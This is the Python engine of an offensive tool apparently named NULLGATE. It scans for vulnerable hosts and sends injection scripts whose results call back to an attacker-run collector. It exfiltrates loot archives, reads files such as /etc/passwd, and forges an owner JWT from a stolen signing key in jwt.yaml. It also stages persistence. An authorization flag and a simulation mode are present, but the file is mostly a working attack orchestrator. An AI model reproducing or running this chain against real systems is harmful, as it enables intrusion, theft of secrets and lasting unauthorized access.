#!/usr/bin/env python3
"""NULLGATE engine -- owns network access, the exploit chain and loot.

The UI never touches the target. It reads a JSON state file and appends
commands to a JSONL command file, exactly like SHARD/KEYSMITH on the Pager.

Phases: idle -> discover -> probe -> plan -> exploit -> loot -> persist -> done

Honesty rule: a stage is "confirmed" ONLY when the target calls back to the
collector with the matching nonce. HTTP 200 from the injection endpoint is
recorded separately as "sent" and is never presented as success.
"""

from __future__ import annotations

import json
import os
import secrets
import tempfile
import time

from . import __version__, attack, collector, discovery, net

STATE = os.environ.get("NULLGATE_STATE", "/tmp/nullgate_state.json")
CMD = os.environ.get("NULLGATE_CMD", "/tmp/nullgate_cmd.jsonl")
LOOT = os.environ.get("NULLGATE_LOOT", "/root/loot/nullgate")
CB_PORT = int(os.environ.get("NULLGATE_CB_PORT", "8844"))
CB_HOST = os.environ.get("NULLGATE_CALLBACK_HOST", "")
TLS = os.environ.get("NULLGATE_TLS", "1").lower() not in ("0", "false", "no")
SIM = os.environ.get("NULLGATE_SIM", "").lower() in ("1", "true", "yes")


def default_state():
    return {
        "app": "NULLGATE",
        "version": __version__,
        "phase": "idle",
        "authorized": False,
        "sim": SIM,
        "tls": TLS,
        "targets": [],
        "target_index": 0,
        "selected": {},
        "probe": {"state": "none", "detail": "", "checked": False},
        "stage": "proof",
        "exploit": {"proof": "none", "loot": "none", "persist": "none"},
        "nonce": "",
        "callback": {"host": CB_HOST, "port": CB_PORT, "active": False},
        "token": "",
        "loot_files": [],
        "read_result": {},
        "logs": ["NULLGATE ready - authorize before targeting"],
        "error": "",
        "stats": {"targets": 0, "vulnerable": 0, "confirmed": 0},
        "updated": time.time(),
    }


def atomic_write(path, obj):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".nullgate-", dir=d)
    try:
        with os.fdopen(fd, "w") as fh:
            json.dump(obj, fh, separators=(",", ":"), sort_keys=True)
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def append_jsonl(path, obj):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    with open(path, "a") as fh:
        fh.write(json.dumps(obj, separators=(",", ":"), sort_keys=True) + "\n")


class Engine:
    def __init__(self, state_path=None, cmd_path=None, loot=None, sim=None,
                 cb_host=None, cb_port=None, tls=None):
        self.state_path = state_path or STATE
        self.cmd_path = cmd_path or CMD
        self.loot = loot or LOOT
        self.sim = SIM if sim is None else sim
        self.cb_port = CB_PORT if cb_port is None else int(cb_port)
        self.cb_host = cb_host if cb_host else CB_HOST
        self.tls = TLS if tls is None else tls
        self.state = default_state()
        self.state["sim"] = self.sim
        self.state["tls"] = self.tls
        self.dirty = True
        self.collector = None

    # --- plumbing ----------------------------------------------------------

    def load_commands(self):
        cmds = []
        try:
            with open(self.cmd_path, "r") as fh:
                lines = fh.readlines()
            with open(self.cmd_path, "w") as fh:
                fh.truncate(0)
        except FileNotFoundError:
            return cmds
        for line in lines:
            try:
                obj = json.loads(line)
                if isinstance(obj, dict):
                    cmds.append(obj)
            except Exception:
                pass
        return cmds

    def log(self, message):
        self.state["logs"] = (self.state.get("logs") or [])[-39:] + [str(message)]
        self.dirty = True

    def _callback_host(self):
        if self.cb_host:
            return self.cb_host
        ips = discovery.local_ips()
        host = ips[0] if ips else "127.0.0.1"
        self.state["callback"]["host"] = host
        return host

    def _start_collector(self):
        if self.sim:
            self.state["callback"]["active"] = True
            return True
        os.makedirs(self.loot, exist_ok=True)
        col = collector.Collector(port=self.cb_port, loot=self.loot)
        if not col.start():
            self.state["error"] = "collector failed: %s" % col.error
            self.log(self.state["error"])
            return False
        self.collector = col
        self.state["callback"]["active"] = True
        self.log("callback collector on :%s" % self.cb_port)
        return True

    # --- commands ----------------------------------------------------------

    def handle(self, cmd):
        action = str(cmd.get("cmd", "")).lower()
        self.state["error"] = ""
        if action == "authorize":
            self.state["authorized"] = bool(cmd.get("value", True))
            self.log("authorization %s" %
                     ("accepted" if self.state["authorized"] else "declined"))
            if self.state["authorized"]:
                self._start_collector()
        elif action == "discover":
            self.discover()
        elif action == "select":
            self.select(int(cmd.get("index", 0)))
        elif action == "probe":
            self.probe()
        elif action == "stage":
            mode = str(cmd.get("mode", "proof")).lower()
            if mode in ("proof", "loot", "persist"):
                self.state["stage"] = mode
                self.log("stage=%s" % mode)
        elif action == "exploit":
            self.exploit(str(cmd.get("stage", self.state["stage"])).lower())
        elif action == "read":
            self.read(cmd.get("path", "/etc/passwd"))
        elif action == "forge":
            self.forge(template=cmd.get("template"), claims=cmd.get("claims"))
        elif action == "reset":
            fresh = default_state()
            fresh["authorized"] = self.state["authorized"]
            self.state = fresh
            self.log("reset")
        elif action == "shutdown":
            self.state["phase"] = "off"
            self.log("shutdown")
        self.dirty = True

    def discover(self):
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            self.log(self.state["error"])
            return
        self.state["phase"] = "discover"
        if self.sim:
            targets = discovery.sample_targets()
        else:
            targets = discovery.scan(tls=self.tls)
        for t in targets:
            t["selectable"] = t.get("state") in ("vulnerable", "inconclusive")
        self.state["targets"] = targets
        vuln = sum(1 for t in targets if t.get("state") == "vulnerable")
        self.state["stats"] = {
            "targets": len(targets), "vulnerable": vuln,
            "confirmed": sum(1 for v in self.state["exploit"].values()
                             if v == "confirmed"),
        }
        self.log("discovered %d hosts (%d vulnerable)" % (len(targets), vuln))
        if targets:
            self.select(0)
        else:
            self.state["phase"] = "idle"

    def select(self, index):
        targets = self.state.get("targets") or []
        if not 0 <= index < len(targets):
            self.state["error"] = "target index out of range"
            return
        target = dict(targets[index])
        self.state["target_index"] = index
        self.state["selected"] = target
        if not target.get("selectable", False):
            self.state["error"] = "target not exploitable: %s" % target.get("state")
        else:
            self.state["phase"] = "plan"
            self.log("selected %s:%s (%s)" % (target.get("host"),
                                              target.get("port"),
                                              target.get("state")))
        self.dirty = True

    def probe(self):
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            return
        target = self.state.get("selected") or {}
        if not target:
            self.state["error"] = "select a target first"
            return
        self.state["phase"] = "probe"
        if self.sim:
            verdict = dict(net.safe_probe(target.get("host", "192.0.2.1"),
                                          target.get("port", 11443)))
            if verdict["state"] == "error":
                verdict = {"state": "vulnerable", "detail": "simulated",
                           "http_status": 200, "baseline_status": 401}
        else:
            verdict = net.safe_probe(target.get("host"), target.get("port"),
                                     tls=self.tls)
        self.state["probe"] = {
            "state": verdict["state"], "detail": verdict["detail"],
            "checked": True, "http_status": verdict.get("http_status", 0),
        }
        if verdict["state"] != "vulnerable":
            self.state["error"] = "target not vulnerable: %s" % verdict["state"]
        self.log("probe: %s - %s" % (verdict["state"], verdict["detail"]))
        self.dirty = True

    def _require_vulnerable(self):
        probe = self.state.get("probe") or {}
        if not probe.get("checked") or probe.get("state") != "vulnerable":
            self.state["error"] = "run a successful safe probe first"
            return False
        if not self.state["authorized"]:
            self.state["error"] = "authorization required first"
            return False
        return True

    def exploit(self, stage):
        if not self._require_vulnerable():
            return
        if stage not in ("proof", "loot", "persist"):
            self.state["error"] = "unknown stage %s" % stage
            return
        target = self.state["selected"]
        nonce = secrets.token_hex(6)
        self.state["nonce"] = nonce
        self.state["phase"] = stage
        self.state["exploit"][stage] = "sent"
        host = self._callback_host()
        port = self.cb_port

        if stage == "proof":
            script = attack.proof_script(nonce, host, port)
        elif stage == "loot":
            script = attack.loot_script(nonce, host, port)
        else:
            if not self.state.get("token"):
                self.forge()  # derive owner token from the looted jwt.yaml
            if self.state.get("error"):
                return
            script = attack.persist_probe_script(
                nonce, host, port, self.state["token"])

        if self.sim:
            http = {"status": 200, "body": "", "error": ""}
            received = True
        else:
            http = net.send_injection(target.get("host"), target.get("port"),
                                      script, tls=self.tls)
            received = self._wait_callback(nonce, stage)
            if http.get("error"):
                self.state["error"] = http["error"]

        record = {
            "ts": time.time(), "stage": stage, "nonce": nonce,
            "target": target.get("host"), "http_status": http.get("status"),
            "callback_confirmed": bool(received),
        }
        append_jsonl(os.path.join(self.loot, "exploit.jsonl"), record)

        if received:
            self.state["exploit"][stage] = "confirmed"
            self.log("%s CONFIRMED via callback (nonce %s)" % (stage, nonce))
        else:
            self.state["exploit"][stage] = "unconfirmed"
            self.log("%s sent (HTTP %s) but NO callback - not confirmed" %
                     (stage, http.get("status")))
        self.state["stats"]["confirmed"] = sum(
            1 for v in self.state["exploit"].values() if v == "confirmed")
        self.dirty = True

    def _wait_callback(self, nonce, stage, timeout=12.0):
        if not self.collector:
            return False
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.collector.seen(nonce):
                data = self.collector.take_loot(nonce)
                if data and stage == "loot":
                    self.state["loot_files"].append(
                        os.path.join(self.loot, "dump_%s.tgz" % nonce[:12]))
                    self.log("loot received (%d bytes b64)" % len(data))
                return True
            time.sleep(0.15)
        return False

    def read(self, path):
        if not self._require_vulnerable():
            return
        target = self.state["selected"]
        if self.sim:
            ok, text = True, "root:x:0:0:root:/root:/bin/bash\n"
        else:
            ok, text = net.read_file(target.get("host"), target.get("port"),
                                     path, tls=self.tls)
        self.state["read_result"] = {"path": path, "ok": ok,
                                     "text": text[:2000]}
        self.log("read %s: %s" % (path, "ok (%d bytes)" % len(text) if ok
                                  else "failed"))
        if ok:
            try:
                with open(os.path.join(self.loot, "reads.jsonl"), "a") as fh:
                    fh.write(json.dumps({"path": path, "text": text[:20000]}) + "\n")
            except Exception:
                pass
        self.dirty = True

    def forge(self, template=None, claims=None):
        """Offline admin-token forge using loot from a confirmed loot stage."""
        import glob
        secret = ""
        candidates = [os.path.join(self.loot, "jwt.yaml")]
        candidates += glob.glob(os.path.join(self.loot, "**", "jwt.yaml"),
                                recursive=True)
        for jwt_path in candidates:
            if not os.path.exists(jwt_path):
                continue
            try:
                with open(jwt_path, errors="replace") as fh:
                    secret = attack.read_jwt_secret(fh.read())
            except Exception:
                continue
            if secret:
                break
        if not secret:
            self.state["error"] = "no jwt.yaml secret in loot - run loot stage"
            return
        token = attack.forge_token(secret, template=template, claims=claims or {
            "role": "owner", "scope": ["*"]})
        self.state["token"] = token
        self.log("forged owner token from stolen HS256 key")
        self.dirty = True

    # --- loop --------------------------------------------------------------

    def tick(self):
        for cmd in self.load_commands():
            self.handle(cmd)
        self.state["updated"] = time.time()
        if self.dirty or self.state["phase"] != "idle":
            atomic_write(self.state_path, self.state)
            self.dirty = False

    def run_forever(self):
        while True:
            self.tick()
            if self.state["phase"] == "off":
                break
            time.sleep(0.15)
        atomic_write(self.state_path, self.state)
        if self.collector:
            self.collector.stop()


def run_forever():
    Engine().run_forever()


def selftest():
    d = tempfile.mkdtemp(prefix="nullgate-selftest-")
    e = Engine(os.path.join(d, "state.json"), os.path.join(d, "cmd.jsonl"),
               os.path.join(d, "loot"), sim=True)
    e.handle({"cmd": "authorize"})
    e.handle({"cmd": "discover"})
    e.handle({"cmd": "select", "index": 0})
    e.handle({"cmd": "probe"})
    e.handle({"cmd": "exploit", "stage": "proof"})
    e.handle({"cmd": "exploit", "stage": "loot"})
    e.handle({"cmd": "read", "path": "/etc/passwd"})
    print("phase=%s targets=%d proof=%s loot=%s read=%s" % (
        e.state["phase"], len(e.state["targets"]),
        e.state["exploit"]["proof"], e.state["exploit"]["loot"],
        e.state["read_result"].get("ok")))


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "selftest":
        selftest()
    else:
        run_forever()
